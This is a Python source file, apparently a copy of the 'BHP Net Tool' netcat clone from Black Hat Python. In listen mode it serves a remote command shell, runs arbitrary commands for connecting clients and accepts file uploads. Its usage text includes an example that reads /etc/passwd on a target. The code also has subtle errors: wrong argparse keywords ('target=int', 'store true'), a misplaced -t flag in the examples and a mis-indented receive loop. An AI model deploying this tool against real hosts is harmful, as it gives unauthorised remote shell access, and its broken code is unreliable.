import argparse
import socket
import shlex
import subprocess
import threading
import sys
import textwrap

def execute(cmd):
    # Strip and check if the command is empty
    cmd = cmd.strip()
    if not cmd:
        return
    # Execute the command and capture the output
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args  # Store command-line arguments
        self.buffer = buffer  # Buffer to send to the server
        # Create a TCP socket
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Enable reusing the address to avoid binding issues
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    def run(self):
        # Determine whether to listen or send based on arguments
        if self.args.listen:
            self.listen()
        else:
            self.send()
            
    def send(self):
        # Connect to the target server
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)  # Send the initial buffer
            try:
                while True:
                    recv_len = 1
                    response = ''
                    # Receive response data from the server
                    while recv_len:
                        data = self.socket.recv(4096)
                        recv_len = len(data)
                        response += data.decode()
                        if recv_len < 4096:
                            break
                        if response:
                            print(response)
                            buffer = input('>')
                            buffer += '\n'
                            self.socket.send(buffer.encode())
            except KeyboardInterrupt:
                print('User Terminated.')
                self.socket.close()
                sys.exit()
    
    def listen(self):
        # Bind the socket to the specified host and port
        self.socket.bind((self.args.host, self.args.port))
        self.socket.listen()
        while True:
            # Accept incoming client connections
            client_socket, _ = self.socket.accept()
            # Start a new thread to handle the client
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()
            
    def handle(self, client_socket):
        # Handle the execution of a command
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        elif self.args.upload:
            # Handle file upload
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                    print(len(file_buffer))
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
        elif self.args.command:
            # Handle a command shell session
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b' #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
            netcap.py -t 192.168.1.108 -p 5555 -t -c #command shell
            netcap.py -t 192.168.1.108 -p 5555 -t -u=mytest.text #upload file
            netcap.py -t 192.168.1.108 -p 5555 -t -e=\"cat /etc/passwd\" #execute command
            echo 'ABC' | ./netcap.py -t 192.168.1.108 -p 135 #echo text to server port 135
            netcap.py -t 192.168.1.108 -p 5555 #connect to server
            '''))
    # Define command-line arguments
    parser.add_argument('-t', '--target', default='192.168.1.203', help='Specified IP')
    parser.add_argument('-p', '--port', target=int, default=5555, help='Specified port')
    parser.add_argument('-l', '--listen', action='store true', help='listen')
    parser.add_argument('-c', '--command', action='store true', help='Command shell')
    parser.add_argument('-u', '--upload', help='Upload file')
    parser.add_argument('-e', '--execute', help='Execute specified command')
    
    # Parse the arguments
    args = parser.parse_args()

    # Determine whether to listen or read from stdin
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    # Create an instance of the NetCat class and run it
    nc = NetCat(args, buffer.encode())
    nc.run()
